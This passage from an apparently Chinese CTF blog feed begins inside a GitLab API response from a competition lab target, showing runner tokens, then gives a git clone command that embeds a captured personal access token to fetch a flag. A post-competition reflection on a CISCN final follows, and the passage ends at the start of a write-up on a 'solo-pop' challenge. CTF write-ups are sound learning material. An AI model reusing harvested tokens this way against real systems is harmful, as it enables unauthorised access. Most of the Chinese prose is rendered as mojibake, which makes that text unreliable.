class="line">        &quot;snippets_enabled&quot;: true,</span><br><span class="line">        &quot;container_registry_enabled&quot;: true,</span><br><span class="line">        &quot;service_desk_enabled&quot;: false,</span><br><span class="line">        &quot;service_desk_address&quot;: null,</span><br><span class="line">        &quot;can_create_merge_request_in&quot;: true,</span><br><span class="line">        &quot;issues_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;repository_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;merge_requests_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;forking_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;wiki_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;builds_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;snippets_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;pages_access_level&quot;: &quot;private&quot;,</span><br><span class="line">        &quot;analytics_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;container_registry_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;security_and_compliance_access_level&quot;: &quot;private&quot;,</span><br><span class="line">        &quot;releases_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;environments_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;feature_flags_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;infrastructure_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;monitor_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;model_experiments_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;model_registry_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;emails_disabled&quot;: false,</span><br><span class="line">        &quot;emails_enabled&quot;: true,</span><br><span class="line">        &quot;shared_runners_enabled&quot;: true,</span><br><span class="line">        &quot;lfs_enabled&quot;: true,</span><br><span class="line">        &quot;creator_id&quot;: 1,</span><br><span class="line">        &quot;import_url&quot;: null,</span><br><span class="line">        &quot;import_type&quot;: &quot;gitlab_project&quot;,</span><br><span class="line">        &quot;import_status&quot;: &quot;finished&quot;,</span><br><span class="line">        &quot;open_issues_count&quot;: 0,</span><br><span class="line">        &quot;description_html&quot;: &quot;&lt;p data-sourcepos=\&quot;1:1-1:27\&quot; dir=\&quot;auto\&quot;&gt;VertexSoft&#x27;s old ERP system&lt;/p&gt;&quot;,</span><br><span class="line">        &quot;updated_at&quot;: &quot;2024-07-11T17:00:07.428Z&quot;,</span><br><span class="line">        &quot;ci_default_git_depth&quot;: 20,</span><br><span class="line">        &quot;ci_forward_deployment_enabled&quot;: true,</span><br><span class="line">        &quot;ci_forward_deployment_rollback_allowed&quot;: true,</span><br><span class="line">        &quot;ci_job_token_scope_enabled&quot;: false,</span><br><span class="line">        &quot;ci_separated_caches&quot;: true,</span><br><span class="line">        &quot;ci_allow_fork_pipelines_to_run_in_parent_project&quot;: true,</span><br><span class="line">        &quot;build_git_strategy&quot;: &quot;fetch&quot;,</span><br><span class="line">        &quot;keep_latest_artifact&quot;: true,</span><br><span class="line">        &quot;restrict_user_defined_variables&quot;: false,</span><br><span class="line">        &quot;runners_token&quot;: &quot;GR1348941iNU3bBzdNg5pzdrmapMJ&quot;,</span><br><span class="line">        &quot;runner_token_expiration_interval&quot;: null,</span><br><span class="line">        &quot;group_runners_enabled&quot;: true,</span><br><span class="line">        &quot;auto_cancel_pending_pipelines&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;build_timeout&quot;: 3600,</span><br><span class="line">        &quot;auto_devops_enabled&quot;: true,</span><br><span class="line">        &quot;auto_devops_deploy_strategy&quot;: &quot;continuous&quot;,</span><br><span class="line">        &quot;ci_config_path&quot;: null,</span><br><span class="line">        &quot;public_jobs&quot;: true,</span><br><span class="line">        &quot;shared_with_groups&quot;: [],</span><br><span class="line">        &quot;only_allow_merge_if_pipeline_succeeds&quot;: false,</span><br><span class="line">        &quot;allow_merge_on_skipped_pipeline&quot;: null,</span><br><span class="line">        &quot;request_access_enabled&quot;: true,</span><br><span class="line">        &quot;only_allow_merge_if_all_discussions_are_resolved&quot;: false,</span><br><span class="line">        &quot;remove_source_branch_after_merge&quot;: true,</span><br><span class="line">        &quot;printing_merge_request_link_enabled&quot;: true,</span><br><span class="line">        &quot;merge_method&quot;: &quot;merge&quot;,</span><br><span class="line">        &quot;squash_option&quot;: &quot;default_off&quot;,</span><br><span class="line">        &quot;enforce_auth_checks_on_uploads&quot;: true,</span><br><span class="line">        &quot;suggestion_commit_message&quot;: null,</span><br><span class="line">        &quot;merge_commit_template&quot;: null,</span><br><span class="line">        &quot;squash_commit_template&quot;: null,</span><br><span class="line">        &quot;issue_branch_template&quot;: null,</span><br><span class="line">        &quot;warn_about_potentially_unwanted_characters&quot;: true,</span><br><span class="line">        &quot;autoclose_referenced_issues&quot;: true,</span><br><span class="line">        &quot;permissions&quot;: &#123;</span><br><span class="line">            &quot;project_access&quot;: &#123;</span><br><span class="line">                &quot;access_level&quot;: 40,</span><br><span class="line">                &quot;notification_level&quot;: null</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;group_access&quot;: &#123;</span><br><span class="line">                &quot;access_level&quot;: 50,</span><br><span class="line">                &quot;notification_level&quot;: 3</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;id&quot;: 1,</span><br><span class="line">        &quot;description&quot;: null,</span><br><span class="line">        &quot;name&quot;: &quot;PortalCode&quot;,</span><br><span class="line">        &quot;name_with_namespace&quot;: &quot;VertexSoft / PortalCode&quot;,</span><br><span class="line">        &quot;path&quot;: &quot;portalcode&quot;,</span><br><span class="line">        &quot;path_with_namespace&quot;: &quot;vertexsoft/portalcode&quot;,</span><br><span class="line">        &quot;created_at&quot;: &quot;2024-07-11T15:53:27.257Z&quot;,</span><br><span class="line">        &quot;default_branch&quot;: &quot;main&quot;,</span><br><span class="line">        &quot;tag_list&quot;: [],</span><br><span class="line">        &quot;topics&quot;: [],</span><br><span class="line">        &quot;ssh_url_to_repo&quot;: &quot;git@192.168.8.42:vertexsoft/portalcode.git&quot;,</span><br><span class="line">        &quot;http_url_to_repo&quot;: &quot;http://192.168.8.42/vertexsoft/portalcode.git&quot;,</span><br><span class="line">        &quot;web_url&quot;: &quot;http://192.168.8.42/vertexsoft/portalcode&quot;,</span><br><span class="line">        &quot;readme_url&quot;: &quot;http://192.168.8.42/vertexsoft/portalcode/-/blob/main/README.md&quot;,</span><br><span class="line">        &quot;forks_count&quot;: 0,</span><br><span class="line">        &quot;avatar_url&quot;: null,</span><br><span class="line">        &quot;star_count&quot;: 0,</span><br><span class="line">        &quot;last_activity_at&quot;: &quot;2024-07-15T14:30:40.441Z&quot;,</span><br><span class="line">        &quot;namespace&quot;: &#123;</span><br><span class="line">            &quot;id&quot;: 2,</span><br><span class="line">            &quot;name&quot;: &quot;VertexSoft&quot;,</span><br><span class="line">            &quot;path&quot;: &quot;vertexsoft&quot;,</span><br><span class="line">            &quot;kind&quot;: &quot;group&quot;,</span><br><span class="line">            &quot;full_path&quot;: &quot;vertexsoft&quot;,</span><br><span class="line">            &quot;parent_id&quot;: null,</span><br><span class="line">            &quot;avatar_url&quot;: null,</span><br><span class="line">            &quot;web_url&quot;: &quot;http://192.168.8.42/groups/vertexsoft&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;repository_storage&quot;: &quot;default&quot;,</span><br><span class="line">        &quot;_links&quot;: &#123;</span><br><span class="line">            &quot;self&quot;: &quot;http://192.168.8.42/api/v4/projects/1&quot;,</span><br><span class="line">            &quot;issues&quot;: &quot;http://192.168.8.42/api/v4/projects/1/issues&quot;,</span><br><span class="line">            &quot;merge_requests&quot;: &quot;http://192.168.8.42/api/v4/projects/1/merge_requests&quot;,</span><br><span class="line">            &quot;repo_branches&quot;: &quot;http://192.168.8.42/api/v4/projects/1/repository/branches&quot;,</span><br><span class="line">            &quot;labels&quot;: &quot;http://192.168.8.42/api/v4/projects/1/labels&quot;,</span><br><span class="line">            &quot;events&quot;: &quot;http://192.168.8.42/api/v4/projects/1/events&quot;,</span><br><span class="line">            &quot;members&quot;: &quot;http://192.168.8.42/api/v4/projects/1/members&quot;,</span><br><span class="line">            &quot;cluster_agents&quot;: &quot;http://192.168.8.42/api/v4/projects/1/cluster_agents&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;packages_enabled&quot;: true,</span><br><span class="line">        &quot;empty_repo&quot;: false,</span><br><span class="line">        &quot;archived&quot;: false,</span><br><span class="line">        &quot;visibility&quot;: &quot;private&quot;,</span><br><span class="line">        &quot;resolve_outdated_diff_discussions&quot;: false,</span><br><span class="line">        &quot;container_expiration_policy&quot;: &#123;</span><br><span class="line">            &quot;cadence&quot;: &quot;1d&quot;,</span><br><span class="line">            &quot;enabled&quot;: false,</span><br><span class="line">            &quot;keep_n&quot;: 10,</span><br><span class="line">            &quot;older_than&quot;: &quot;90d&quot;,</span><br><span class="line">            &quot;name_regex&quot;: &quot;.*&quot;,</span><br><span class="line">            &quot;name_regex_keep&quot;: null,</span><br><span class="line">            &quot;next_run_at&quot;: &quot;2024-07-12T15:53:27.309Z&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;repository_object_format&quot;: &quot;sha1&quot;,</span><br><span class="line">        &quot;issues_enabled&quot;: true,</span><br><span class="line">        &quot;merge_requests_enabled&quot;: true,</span><br><span class="line">        &quot;wiki_enabled&quot;: true,</span><br><span class="line">        &quot;jobs_enabled&quot;: true,</span><br><span class="line">        &quot;snippets_enabled&quot;: true,</span><br><span class="line">        &quot;container_registry_enabled&quot;: true,</span><br><span class="line">        &quot;service_desk_enabled&quot;: false,</span><br><span class="line">        &quot;service_desk_address&quot;: null,</span><br><span class="line">        &quot;can_create_merge_request_in&quot;: true,</span><br><span class="line">        &quot;issues_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;repository_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;merge_requests_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;forking_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;wiki_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;builds_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;snippets_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;pages_access_level&quot;: &quot;private&quot;,</span><br><span class="line">        &quot;analytics_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;container_registry_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;security_and_compliance_access_level&quot;: &quot;private&quot;,</span><br><span class="line">        &quot;releases_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;environments_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;feature_flags_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;infrastructure_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;monitor_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;model_experiments_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;model_registry_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;emails_disabled&quot;: false,</span><br><span class="line">        &quot;emails_enabled&quot;: true,</span><br><span class="line">        &quot;shared_runners_enabled&quot;: true,</span><br><span class="line">        &quot;lfs_enabled&quot;: true,</span><br><span class="line">        &quot;creator_id&quot;: 1,</span><br><span class="line">        &quot;import_url&quot;: null,</span><br><span class="line">        &quot;import_type&quot;: null,</span><br><span class="line">        &quot;import_status&quot;: &quot;none&quot;,</span><br><span class="line">        &quot;open_issues_count&quot;: 0,</span><br><span class="line">        &quot;description_html&quot;: &quot;&quot;,</span><br><span class="line">        &quot;updated_at&quot;: &quot;2024-07-15T14:37:09.617Z&quot;,</span><br><span class="line">        &quot;ci_default_git_depth&quot;: 20,</span><br><span class="line">        &quot;ci_forward_deployment_enabled&quot;: true,</span><br><span class="line">        &quot;ci_forward_deployment_rollback_allowed&quot;: true,</span><br><span class="line">        &quot;ci_job_token_scope_enabled&quot;: false,</span><br><span class="line">        &quot;ci_separated_caches&quot;: true,</span><br><span class="line">        &quot;ci_allow_fork_pipelines_to_run_in_parent_project&quot;: true,</span><br><span class="line">        &quot;build_git_strategy&quot;: &quot;fetch&quot;,</span><br><span class="line">        &quot;keep_latest_artifact&quot;: true,</span><br><span class="line">        &quot;restrict_user_defined_variables&quot;: false,</span><br><span class="line">        &quot;runners_token&quot;: &quot;GR13489414oQjRCnTobkTwZpR65iS&quot;,</span><br><span class="line">        &quot;runner_token_expiration_interval&quot;: null,</span><br><span class="line">        &quot;group_runners_enabled&quot;: true,</span><br><span class="line">        &quot;auto_cancel_pending_pipelines&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;build_timeout&quot;: 3600,</span><br><span class="line">        &quot;auto_devops_enabled&quot;: true,</span><br><span class="line">        &quot;auto_devops_deploy_strategy&quot;: &quot;continuous&quot;,</span><br><span class="line">        &quot;ci_config_path&quot;: null,</span><br><span class="line">        &quot;public_jobs&quot;: true,</span><br><span class="line">        &quot;shared_with_groups&quot;: [],</span><br><span class="line">        &quot;only_allow_merge_if_pipeline_succeeds&quot;: false,</span><br><span class="line">        &quot;allow_merge_on_skipped_pipeline&quot;: null,</span><br><span class="line">        &quot;request_access_enabled&quot;: true,</span><br><span class="line">        &quot;only_allow_merge_if_all_discussions_are_resolved&quot;: false,</span><br><span class="line">        &quot;remove_source_branch_after_merge&quot;: true,</span><br><span class="line">        &quot;printing_merge_request_link_enabled&quot;: true,</span><br><span class="line">        &quot;merge_method&quot;: &quot;merge&quot;,</span><br><span class="line">        &quot;squash_option&quot;: &quot;default_off&quot;,</span><br><span class="line">        &quot;enforce_auth_checks_on_uploads&quot;: true,</span><br><span class="line">        &quot;suggestion_commit_message&quot;: null,</span><br><span class="line">        &quot;merge_commit_template&quot;: null,</span><br><span class="line">        &quot;squash_commit_template&quot;: null,</span><br><span class="line">        &quot;issue_branch_template&quot;: null,</span><br><span class="line">        &quot;warn_about_potentially_unwanted_characters&quot;: true,</span><br><span class="line">        &quot;autoclose_referenced_issues&quot;: true,</span><br><span class="line">        &quot;permissions&quot;: &#123;</span><br><span class="line">            &quot;project_access&quot;: null,</span><br><span class="line">            &quot;group_access&quot;: &#123;</span><br><span class="line">                &quot;access_level&quot;: 50,</span><br><span class="line">                &quot;notification_level&quot;: 3</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>git ä¸‹æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone http://192.168.8.42:glpat-bGEgHAJDvwaPP78rsLeS@192.168.8.42/vertexsoft/vertexsoftbackup.git</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ª txt æ–‡ä»¶ï¼Œé‡Œé¢å°±æœ‰ flag</p><h3 id="rodc"><span id="rodc"> RODC</span></h3><p>å¯æƒœäº†ï¼Œ30 å¤šè§£ 600 åˆ†çš„é¢˜æ²¡å‡ºï¼Œè¯´æ˜¯æ‰“ä¸‹çš„ mysql é‚£å°æœºå­æœ‰ä¸ªæ–‡ä»¶ï¼Œé‡Œé¢æœ‰è´¦å¯†ï¼Œmd30 å¤šè§£å‡ºä¸äº†ï¼Œ4 è§£çš„é¢˜æ‹¿ä¸€è¡€ï¼Œæˆ‘çœŸæœäº†æˆ‘è¿™ã€‚</p><p>ä¸€ä¸ªäººæ‰“æ¸—é€æ€è·¯è¿˜æ˜¯å¤ªå±€é™äº†</p><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/b11e9cec339a2ebb171635969a11832.jpg" alt="b11e9cec339a2ebb171635969a11832"></p><p>å¥½åœ¨æœ€åè¿˜æ˜¯æ‹¿äº†å›½ä¸€ï¼Œrank14.</p><h1 id="åæ—¥è°ˆ"><span id="åæ—¥è°ˆ"> åæ—¥è°ˆ</span></h1><p>è¿™æ¬¡çš„è¡¨ç°ä¸å¤Ÿå®Œç¾ï¼Œè¯´å®è¯è¿™æ¬¡å¯¹è‡ªå·±æ²¡é‚£ä¹ˆè‡ªä¿¡ï¼Œå‹åŠ›ä¹ŸæŒºå¤§çš„ï¼Œå› ä¸ºæœ¬æ¥æˆ‘ä»¬é˜Ÿä¼å¹¶ä¸æ˜¯æœ€å¼ºçš„é˜Ÿä¼ï¼Œæœ¬æ¥æˆ‘ä»¬æŒ‡æœ›è‡ªå·±å†²å›½ä¸€çš„å¸Œæœ›ä¸å¤§ï¼Œæƒ³ç€æ˜¯å±±æ²³ giegie ä»–ä»¬é‚£é˜Ÿå†²å›½ä¸€ï¼Œæˆ‘ä»¬æ‹¿ä¸ªå›½äºŒå•¥çš„ç¨³ä¸€ä¸‹ï¼Œç»“æœä¸å‡ºæ„å¤–çš„è¯å‡ºäº†æ„å¤–ã€‚ç„¶åæ‹¿å›½ä¸€çš„é‡ä»»å°±ç»™æˆ‘ä»¬äº†ï¼Œæˆ‘ä»¬é˜Ÿä¸€ä¸ª webã€ä¸€ä¸ª pwnã€ä¸€ä¸ª reã€ä¸€ä¸ª miscã€‚è¯´çœŸçš„æ‰“å›½èµ›è¿™ç§çº¿ä¸‹ï¼Œå°¤å…¶æ˜¯ awdp å’Œæ¸—é€å å¤§å¤´çš„èµ›åˆ¶ï¼Œç›¸å¯¹è€Œè¨€æ¯”è¾ƒåƒäºã€‚å¾ˆå¤šå…¶å®ƒé˜Ÿä¼å¥½åƒæœ‰ä¸¤ä¸ª web æ‰‹ï¼ŒæŠ—è¡¡èµ·æ¥è¿˜æ˜¯å¾ˆéš¾çš„ã€‚åœ¨æ­£å¼æ¯”èµ›çš„å‰ä¸€å¤©æ™šä¸Šï¼Œæˆ‘å’Œ kâœŒè¯´è‡ªå·±ä¸€ä¸ª web æ‰‹æ‰“äººå®¶ä¸¤ä¸ª web æœ‰ç‚¹åƒåŠ›ï¼Œä»–è¯´æˆ‘è¦ç›¸ä¿¡è‡ªå·±ï¼Œä¸€ä¸ª web æ‰“ä¸¤ä¸ª web æ²¡é—®é¢˜çš„ã€‚</p><p>ç»“æœæ˜¯å¥½çš„ï¼Œåªæ˜¯è‡ªå·±çš„ä¸€äº›å°å¤±è¯¯ï¼Œå‘æŒ¥æ²¡é‚£ä¹ˆå®Œç¾ï¼Œå…¶å®æœ‰æœ›å‰åçš„ï¼Œè‡ªå·±ä¸¤å¤©éƒ½çŠ¯å¤±è¯¯äº†ï¼Œæ²¡åŠæ³•ï¼Œäººç”Ÿæ€»ä¼šæœ‰ä¸å®Œç¾çš„ï¼Œæ€»æ˜¯ä¼šæœ‰ç‚¹é—æ†¾çš„ï¼Œä»Šå¹´çš„é—æ†¾è¿˜èƒ½æ¥å—ï¼Œå»å¹´</p><p>å±±æ²³ giegie ä»–ä»¬ awd è¿›äº†å¤§å‘ï¼Œèµ›å® awd ç»™çš„æ˜¯ç§é’¥ç™»å½•ï¼Œä½†æ˜¯ä»–ä»¬å››ä¸ªäººå…¨ç”¨ finalshellï¼Œæ²¡æœ‰ xshellï¼Œfinalshell æ²¡æ³•ç§é’¥ç™»è¿›å»ï¼Œè¯´æ˜¯ç­‰äº†ä¸€ä¸ªå¤šå°æ—¶æ‰¾å·¥ä½œäººå‘˜æ‹·äº† xshellã€‚awd å°‘ä¸€ä¸ªå°æ—¶å•¥æ¦‚å¿µå•Šï¼ŒkâœŒè¯´æ˜¯ awd æ‰“äº† 60 å¤šï¼Œå¥½åœ¨ç¬¬äºŒå¤©ä»–ä»¬æ¸—é€ä¸Šåˆ†ï¼Œå†²åˆ°äº†å›½äºŒï¼Œå¾ˆé—æ†¾ï¼Œæœ¬æ¥æ˜¯ç”±å›½ä¸€çš„ï¼Œäºæ˜¯ä»–ä»¬ä»Šå¹´æ‰“ç®—å†å†²ä¸€å¹´å†²ä¸ªå›½ä¸€ï¼Œç»“æœä¸–äº‹éš¾æ–™ï¼Œä»Šå¹´åœ¨åˆ†åŒºèµ›æå‰é€€å½¹äº†å±äºæ˜¯ğŸ˜­ï¼Œåœ¨æ­¤è‡´æ•¬ä¼ å¥‡ web æ‰‹å±±æ²³ã€‚</p><p>ä»Šå¹´ä¸Šæµ·å¤§å­¦ç”Ÿçº¿ä¸‹ä¹Ÿæ˜¯èµ›å®åŠçš„ awdï¼Œå½“æ—¶å’Œ inkey è¿˜æœ‰ğŸ±âœŒä¸€èµ·ï¼Œå¼€å§‹å‰å¬åˆ°è£åˆ¤è¯´ç”¨æ–‡ä»¶ç™»å½•é¶æœºï¼Œç›´æ¥åº”æ¿€äº†ï¼Œç«‹é©¬å°±å’Œ inkeyâœŒè¯´è®©ä»–ç°ä¸‹ä¸€ä¸ª xshellã€‚</p><p>å¸¦ç€å±±æ²³ giegie çš„æ„å¿—ä»¥åŠæŒ‡å¯¼è€å¸ˆçš„æœŸæœ›ï¼Œæ‰‹æ„Ÿç«çƒ­æ‹¿äº†å›½ä¸€ï¼ŒkâœŒç”±äºè¦å’Œç”Ÿæ´»å¯¹çº¿ï¼Œæ‰“å®Œè¿™åœºä¹Ÿæ˜¯ç›´æ¥é€€å½¹äº†ã€‚ä¸€å¥ç»å…¸è¯´çš„å¥½ï¼Œâ€œå¦‚ä»Šå›½ä¸€å°±åœ¨æˆ‘é¢å‰ï¼Œæˆ‘å¿…é¡»å¾—è€ƒè™‘è¿™æ˜¯å¦ä¼šæ˜¯æˆ‘æ­¤ç”Ÿä»…æœ‰çš„æœºä¼šâ€ã€‚èƒ½æ‰“å›½èµ›çš„æœºä¼šä¸å¤šï¼Œå¤§ä¸€ä¸‹å¾ˆéš¾æœ‰èµ„æ ¼æˆ–å®åŠ›æ‰“è¿›å›½å†³ï¼Œå¤§äºŒæ˜¯æœ€æœ‰å¸Œæœ›çš„ä¸€å¹´ï¼Œå› ä¸ºå¤§ä¸‰å› ä¸ºå®ä¹ ã€å‡†å¤‡å·¥ä½œç­‰å„ç§äº‹åˆ†æ•£ç²¾åŠ›ï¼Œå†²å›½ä¸€çš„å¯èƒ½æ€§ä¹Ÿå°‘äº†ã€‚</p><p>æ‰“å®Œæ¯”èµ›ä¹Ÿæ˜¯èµ°ä¸€èµ°å››å·çœ‹ä¸€çœ‹</p><p>è¿™ç¾ä¸½çš„å·å¸¦ï¼Œè¿™å»ºç­‘ï¼ŒæŸåŒ—äº¬éƒŠåŒºå­¦æ ¡ç¾¡æ…•äº†ã€‚</p><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/be61b4207672c398d33c746fe7e74af.jpg" alt="be61b4207672c398d33c746fe7e74af"></p><p>è¿˜æœ‰æœ€åä¸€å¤©çš„ä¸–ç•Œçº¿<img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/01ee05a645bde97b3be7ab81b63ce0b.jpg" alt="01ee05a645bde97b3be7ab81b63ce0b"></p><p>å»æ¼«å±•é›†é‚®ï¼ŒæŠ“åˆ°äº†ä¸€ä¸ªå®å®çš„ cosâ˜ğŸ¤“ï¼Œä¹‹å‰åŸºæœ¬æ²¡çœ‹åˆ°ï¼Œæ²¡æƒ³åˆ°èƒ½åœ¨æˆéƒ½çœ‹åˆ°æœ‰äººå‡ºï¼Œæˆ‘å¤§èƒ†åœ°å»æ‰¾äº†ï¼Œç„¶åé€äº†æ— æ–™ï¼Œç”¨å¿ƒäº†</p><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/85c6f962b4bf9946afdefafb6388769.jpg" alt="85c6f962b4bf9946afdefafb6388769"></p><p>éå¸¸ç²¾è‡´ï¼Œç”šè‡³æœ‰è”ç³»æ–¹å¼ï¼Œè¯šé‚€æˆ‘ä»¬æ‰©åˆ—ï¼Œåªå¯æƒœå½“æ—¶æ˜¯ 22 å·è€Œä¸æ˜¯ 21 å·ï¼Œä¸ç„¶è¿™ä¸ªå®å®è‚¯å®šæ˜¯ç¥æ¥ä¹‹ç¬”äº†ã€‚</p><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/a2fcb77d6bb2540e7c60dea81f25880.jpg" alt="a2fcb77d6bb2540e7c60dea81f25880"></p><p>ä»¥åŠä¸€äº›ç—›è½¦ã€‚ã€‚ã€‚ã€‚</p><p>æˆéƒ½ä¹‹æ—…ç»“æŸäº†ï¼Œè¯´å®è¯æ‹¿äº†å›½ä¸€ï¼Œå¯ä»¥é€‰æ‹©é€€å½¹äº†ï¼Œåšç‚¹è‡ªå·±å–œæ¬¢çš„äº‹ï¼Œä¸è¿‡æ ¡é˜Ÿ 23 æ²¡ web æ‰‹ï¼Œæˆ‘è¿˜å¾—è€ƒè™‘ä¸€ä¸‹æ‰¾æ–°çš„ web çˆ¹ï¼Œç‰©è¯­è¿˜åœ¨ç»§ç»­ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://1llustrious.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://1llustrious.github.io/tags/WP/"/>
    
    <category term="æ‚è°ˆ" scheme="https://1llustrious.github.io/tags/%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>äº¬éº’CTFè¡¥å®Œè®¡åˆ’</title>
    <link href="https://1llustrious.github.io/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/"/>
    <id>https://1llustrious.github.io/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/</id>
    <published>2023-12-22T14:23:49.000Z</published>
    <updated>2023-12-22T14:33:24.063Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="å†™åœ¨å‰é¢"><span id="å†™åœ¨å‰é¢"> å†™åœ¨å‰é¢</span></h1><p>ğŸ‘´ä»¥ä¸ºåªèƒ½å¤ç° webshell, ä½†æ²¡ç›¸åˆ°ï¼Œez_oracle æœ‰å¸ˆå‚…å†™äº† wp,pop-chain å¤§å¤´ğŸ‘´ä¸ä»…å†™äº† wp, è¿˜åšäº†å¤ç°ç¯å¢ƒ.</p><p>ä»¥ä¸‹æ˜¯å‚è€ƒæ–‡çŒ®æ:</p><p><a href="https://www.yuque.com/dat0u/ctf/sderglp3e16086dg">2023 äº¬éº’ CTF solo-pop (yuque.com)</a></p><p><a href="https://exp10it.cn/2023/12/2023-%E4%BA%AC%E9%BA%92-ctf-ez_oracle-writeup/">2023 äº¬éº’ CTF ez_oracle Writeup - X1r0z Blog (exp10it.cn)</a></p><p>å—é‚®çš„ N1âœŒ</p><p><a href="https://boogipop.com/2023/12/15/Oracle%20%E6%B3%A8%E5%85%A5%20RCE%20%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1/">Oracle æ³¨å…¥ RCE ç”±æµ…å…¥æ·± - Boogiepop Doesnâ€™t Laugh (boogipop.com)</a></p><p>å¤§ B å“¥ï¼</p><h1 id="solo-pop"><span id="solo-pop"> solo-pop</span></h1><p>æ¯”èµ›æ—¶ï¼Œâ›°ï¸ğŸ“¦é ç€ä¸€ä¸ªéé¢„æœŸæ‹¿ä¸‹äº†ä¸€è¡€ï¼Œæˆ‘å°±æ¥çœ‹çœ‹é¢„æœŸå’‹å¹²çš„.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d -p <span class="number">12345</span>:<span class="number">80</span> -e FLAG=flag&#123;8382843b-d3e8-72fc-<span class="number">6625</span>-ba5269953b23&#125; ccr.ccs.tencentyun.com/lxxxin/public:jqctf2023-solo-pop</span><br></pre></td></tr></table></figure><p>æˆ‘é˜é‡Šä½ çš„æ¢¦ï¼Œæœ¬åœ°è·‘ä¸äº†ï¼ŒæŠ¥ä¸ªä»€ä¹ˆ EOF é”™è¯¯ï¼Œæ”¾åœ¨ VPS ä¸Š nmd ç¬é—´è·‘èµ·æ¥äº†ğŸ˜…ğŸ˜…</p><p>robots.txt</p><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/1702599947178.png" alt="1702599947178"></p><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/image-20231215082635862.png" alt="image-20231215082635862"></p><p>å¯ä»¥å°†.wupco åç¼€æ–‡ä»¶å½“æˆ php æ–‡ä»¶è§£æ</p><p>çœ‹ä¸€ä¸‹ redis é…ç½®</p><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/1702600198390.png" alt="1702600198390"></p><p>ç»™äº† redis å¯†ç ï¼Œé‚£ä¹ˆè¿™é“é¢˜åº”è¯¥ä¼šå»æ‰“ä¸€ä¸ª redis</p><h2 id="æºç é‰´èµ"><span id="æºç é‰´èµ"> æºç é‰´èµ</span></h2><p>å®šä¹‰äº†ä¸€ä¸ªç±»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 